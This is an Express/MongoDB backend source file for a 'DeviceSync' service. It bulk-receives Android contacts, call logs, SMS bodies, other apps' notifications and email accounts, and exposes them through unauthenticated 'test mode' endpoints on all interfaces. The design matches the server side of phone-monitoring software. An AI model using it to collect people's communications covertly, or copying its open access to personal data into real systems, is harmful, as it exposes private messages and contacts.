const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const crypto = require('crypto');


// Import models
const Device = require('./models/Device');
const Contact = require('./models/Contact');
const CallLog = require('./models/CallLog');
const Message = require('./models/Message');
const Notification = require('./models/Notification');
const EmailAccount = require('./models/EmailAccount');


const app = express();
const PORT = 5001;

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/sync_data';

mongoose.connect(MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => {
    console.log('✅ Connected to MongoDB database: sync_data');
})
.catch((error) => {
    console.error('❌ MongoDB connection error:', error);
    process.exit(1);
});



// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Helper function to generate data hash for duplicate detection
function generateDataHash(deviceId, dataType, data) {
    const dataString = JSON.stringify(data);
    return crypto.createHash('md5').update(`${deviceId}-${dataType}-${dataString}`).digest('hex');
}

// Upload last 5 images endpoint - placed early to avoid conflicts
app.post('/api/test/devices/:deviceId/upload-last-5-images', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log(`📸 Upload request for device: ${deviceId}`);
        console.log(`📁 Request body:`, req.body);
        
        return res.json({
            success: true,
            message: 'Upload endpoint reached successfully',
            deviceId: deviceId
        });
        
    } catch (error) {
        console.error('❌ Error uploading files:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to upload files',
            message: error.message
        });
    }
});

// Health check endpoint
app.get('/api/health', async (req, res) => {
    try {
        const deviceCount = await Device.countDocuments();
        const contactCount = await Contact.countDocuments();
        const callLogCount = await CallLog.countDocuments();
        const messageCount = await Message.countDocuments();
        const notificationCount = await Notification.countDocuments();
        const emailCount = await EmailAccount.countDocuments();
        
        const totalSyncedRecords = contactCount + callLogCount + messageCount + notificationCount + emailCount;
        
        res.json({
            success: true,
            message: 'DeviceSync Backend Server is running with MongoDB',
            timestamp: new Date().toISOString(),
            database: 'MongoDB',
            stats: {
                devices: deviceCount,
                syncedRecords: totalSyncedRecords
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
});





// Upload last 5 images endpoint - placed early to avoid conflicts
app.post('/api/test/devices/:deviceId/upload-last-5-images', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log(`📸 Upload request for device: ${deviceId}`);
        console.log(`📁 Request body:`, req.body);
        
        return res.json({
            success: true,
            message: 'Upload endpoint reached successfully',
            deviceId: deviceId
        });
        
    } catch (error) {
        console.error('❌ Error uploading files:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to upload files',
            message: error.message
        });
    }
});

// Core Sync Data Endpoint (NO AUTHENTICATION - For Testing)
app.post('/api/test/devices/:deviceId/sync', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { dataType, data, timestamp } = req.body;
        
        console.log(`🔓 TEST MODE: Syncing ${dataType} for device ${deviceId}. Items: ${data.length}`);
        
        let itemsSynced = 0;
        let Model, collectionName;
        
        // Determine which model to use based on data type
        switch (dataType) {
            case 'CONTACTS':
                Model = Contact.getModelForDevice(deviceId);
                collectionName = Contact.getCollectionName(deviceId);
                break;
            case 'CALL_LOGS':
                Model = CallLog.getModelForDevice(deviceId);
                collectionName = CallLog.getCollectionName(deviceId);
                break;
            case 'MESSAGES':
                Model = Message.getModelForDevice(deviceId);
                collectionName = Message.getCollectionName(deviceId);
                break;
            case 'NOTIFICATIONS':
                Model = Notification.getModelForDevice(deviceId);
                collectionName = Notification.getCollectionName(deviceId);
                break;
            case 'EMAIL_ACCOUNTS':
                Model = EmailAccount.getModelForDevice(deviceId);
                collectionName = EmailAccount.getCollectionName(deviceId);
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }
        
        // Process each item
        for (const item of data) {
            try {
                console.log(`Processing ${dataType} item:`, JSON.stringify(item, null, 2));
                // Map fields based on data type
                let mappedItem = { ...item };
                
                switch (dataType) {
                    case 'CALL_LOGS':
                        // Map Android call log fields to database fields
                        const callType = (item.type || item.callType || '').toUpperCase();
                        const validCallTypes = ['INCOMING', 'OUTGOING', 'MISSED', 'REJECTED', 'BLOCKED'];
                        const mappedCallType = validCallTypes.includes(callType) ? callType : 'INCOMING';
                        
                        // Handle timestamp conversion properly
                        let callTimestamp;
                        try {
                            if (item.date) {
                                const dateValue = parseInt(item.date);
                                if (!isNaN(dateValue) && dateValue > 0) {
                                    callTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                } else {
                                    callTimestamp = new Date();
                                }
                            } else if (item.timestamp) {
                                const timestampValue = parseInt(item.timestamp);
                                if (!isNaN(timestampValue) && timestampValue > 0) {
                                    callTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                } else {
                                    callTimestamp = new Date();
                                }
                            } else {
                                callTimestamp = new Date();
                            }
                            
                            // Final validation - ensure we have a valid date
                            if (isNaN(callTimestamp.getTime()) || callTimestamp.getTime() <= 0) {
                                console.warn(`Invalid timestamp for call log, using current time. Original value: ${item.date || item.timestamp}`);
                                callTimestamp = new Date();
                            }
                        } catch (error) {
                            console.warn(`Error parsing timestamp for call log: ${error.message}, using current time`);
                            callTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            phoneNumber: item.phoneNumber || item.number || 'Unknown',
                            contactName: item.name || item.contactName || '',
                            callType: mappedCallType,
                            timestamp: callTimestamp,
                            duration: parseInt(item.duration) || 0
                        };
                        break;
                    case 'CONTACTS':
                        // Map Android contact fields to database fields
                        console.log('Processing CONTACTS item:', item);
                        
                        console.log('phoneNumbers:', item.phoneNumbers);
                        console.log('phoneNumber:', item.phoneNumber);
                        const contactPhoneNumber = (item.phoneNumbers && item.phoneNumbers.length > 0) 
                            ? item.phoneNumbers[0] 
                            : (item.phoneNumber || '+0000000000');
                        console.log('Final contactPhoneNumber:', contactPhoneNumber);
                        
                        mappedItem = {
                            name: item.name || 'Unknown Contact',
                            phoneNumber: contactPhoneNumber,
                            phoneType: item.phoneType || 'MOBILE',
                            emails: item.emails || [],
                            organization: item.organization || item.company || ''
                        };
                        
                        console.log('Mapped CONTACTS item:', mappedItem);
                        break;
                    case 'MESSAGES':
                        // Map Android message fields to database fields
                        const messageType = (item.type || 'SMS').toUpperCase();
                        const validMessageTypes = ['SMS', 'MMS'];
                        const mappedMessageType = validMessageTypes.includes(messageType) ? messageType : 'SMS';
                        
                        // Handle timestamp conversion properly
                        let messageTimestamp;
                        try {
                            if (item.date) {
                                const dateValue = parseInt(item.date);
                                if (!isNaN(dateValue) && dateValue > 0) {
                                    messageTimestamp = new Date(dateValue > 1000000000000 ? dateValue : dateValue * 1000);
                                } else {
                                    messageTimestamp = new Date();
                                }
                            } else if (item.timestamp) {
                                const timestampValue = parseInt(item.timestamp);
                                if (!isNaN(timestampValue) && timestampValue > 0) {
                                    messageTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                } else {
                                    messageTimestamp = new Date();
                                }
                            } else {
                                messageTimestamp = new Date();
                            }
                            
                            // Final validation - ensure we have a valid date
                            if (isNaN(messageTimestamp.getTime()) || messageTimestamp.getTime() <= 0) {
                                console.warn(`Invalid timestamp for message, using current time. Original value: ${item.date || item.timestamp}`);
                                messageTimestamp = new Date();
                            }
                        } catch (error) {
                            console.warn(`Error parsing timestamp for message: ${error.message}, using current time`);
                            messageTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            address: item.address || item.phoneNumber || 'Unknown',
                            body: item.body || item.message || '',
                            type: mappedMessageType,
                            isIncoming: item.type === 'inbox' || item.isIncoming !== false,
                            timestamp: messageTimestamp,
                            isRead: item.read || item.isRead || false
                        };
                        break;
                    case 'NOTIFICATIONS':
                        // Map Android notification fields to database fields
                        console.log('Processing NOTIFICATIONS item:', item);
                        
                        // Handle timestamp conversion properly
                        let notificationTimestamp;
                        try {
                            if (item.postTime) {
                                const postTimeValue = parseInt(item.postTime);
                                if (!isNaN(postTimeValue) && postTimeValue > 0) {
                                    notificationTimestamp = new Date(postTimeValue > 1000000000000 ? postTimeValue : postTimeValue * 1000);
                                } else {
                                    notificationTimestamp = new Date();
                                }
                            } else if (item.timestamp) {
                                const timestampValue = parseInt(item.timestamp);
                                if (!isNaN(timestampValue) && timestampValue > 0) {
                                    notificationTimestamp = new Date(timestampValue > 1000000000000 ? timestampValue : timestampValue * 1000);
                                } else {
                                    notificationTimestamp = new Date();
                                }
                            } else {
                                notificationTimestamp = new Date();
                            }
                            
                            // Final validation - ensure we have a valid date
                            if (isNaN(notificationTimestamp.getTime()) || notificationTimestamp.getTime() <= 0) {
                                console.warn(`Invalid timestamp for notification, using current time. Original value: ${item.postTime || item.timestamp}`);
                                notificationTimestamp = new Date();
                            }
                        } catch (error) {
                            console.warn(`Error parsing timestamp for notification: ${error.message}, using current time`);
                            notificationTimestamp = new Date();
                        }
                        
                        mappedItem = {
                            notificationId: item.notificationId || `notif_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            packageName: item.packageName || 'com.unknown.app',
                            appName: item.appName || item.packageName || 'Unknown App',
                            title: item.title || '',
                            text: item.text || item.body || '',
                            timestamp: notificationTimestamp
                        };
                        console.log('Mapped NOTIFICATIONS item:', mappedItem);
                        break;
                    case 'EMAIL_ACCOUNTS':
                        // Map email account fields to database fields
                        mappedItem = {
                            accountId: item.accountId || `acc_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            emailAddress: item.emailAddress || item.email,
                            accountName: item.accountName || item.name || '',
                            provider: item.provider === 'gmail' ? 'Gmail' : 
                                    item.provider === 'outlook' ? 'Outlook' : 
                                    item.provider === 'yahoo' ? 'Yahoo' : 
                                    item.provider === 'icloud' ? 'iCloud' : 'Other',
                            accountType: item.accountType || 'IMAP',
                            isActive: item.isActive !== undefined ? item.isActive : true
                        };
                        break;
                }
                
                // Generate data hash for duplicate detection
                const dataHash = generateDataHash(deviceId, dataType, mappedItem);
                
                // Check if data already exists
                const existingData = await Model.findOne({ dataHash });
                if (existingData) {
                    console.log(`Data already exists for ${dataType}, skipping duplicate`);
                    continue;
                }
                
                // Add data hash to mapped item
                mappedItem.dataHash = dataHash;
                
                // Create new record
                const newRecord = new Model(mappedItem);
                await newRecord.save();
                
                itemsSynced++;
                
            } catch (itemError) {
                console.error(`❌ Error processing ${dataType} item:`, itemError);
                console.error(`❌ Item data:`, JSON.stringify(item, null, 2));
                console.error(`❌ Mapped item:`, JSON.stringify(mappedItem, null, 2));
            }
        }
        
        console.log(`✅ TEST MODE: Successfully synced ${itemsSynced} ${dataType} items to ${collectionName}`);
        
        res.json({
            success: true,
            data: {
                success: true,
                itemsSynced,
                message: `TEST MODE: ${itemsSynced} items synced successfully to ${collectionName}`
            }
        });
        
    } catch (error) {
        console.error('Error syncing data:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to sync data'
        });
    }
});

// Get synced data for a device
app.get('/api/test/devices/:deviceId/:dataType', async (req, res) => {
    try {
        const { deviceId, dataType } = req.params;
        const { page = 1, limit = 100 } = req.query;
        
        let Model;
        
        // Determine which model to use based on data type
        switch (dataType) {
            case 'contacts':
                Model = Contact.getModelForDevice(deviceId);
                break;
            case 'call-logs':
                Model = CallLog.getModelForDevice(deviceId);
                break;
            case 'messages':
                Model = Message.getModelForDevice(deviceId);
                break;
            case 'notifications':
                Model = Notification.getModelForDevice(deviceId);
                break;
            case 'email-accounts':
                Model = EmailAccount.getModelForDevice(deviceId);
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }
        
        const data = await Model.find({})
            .sort({ syncTime: -1 })
            .limit(limit * 1)
            .skip((page - 1) * limit);
        
        const total = await Model.countDocuments({});
        
        res.json({
            success: true,
            data: {
                deviceId,
                dataType,
                items: data,
                pagination: {
                    current: page,
                    pages: Math.ceil(total / limit),
                    total
                }
            }
        });
        
    } catch (error) {
        console.error('Error getting data:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get data'
        });
    }
});



// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 DeviceSync Backend Server running on http://localhost:${PORT}`);
    console.log(`📱 API Base URL: http://localhost:${PORT}/api/`);
    console.log(`🏥 Health Check: http://localhost:${PORT}/api/health`);
    console.log(`📱 For Android Emulator: http://10.0.2.2:${PORT}/api/`);
    console.log(`🗄️  Database: MongoDB (sync_data)`);
    console.log(`✅ Core syncing ready: Contacts, CallLogs, Messages, Notifications, EmailAccounts`);
}); 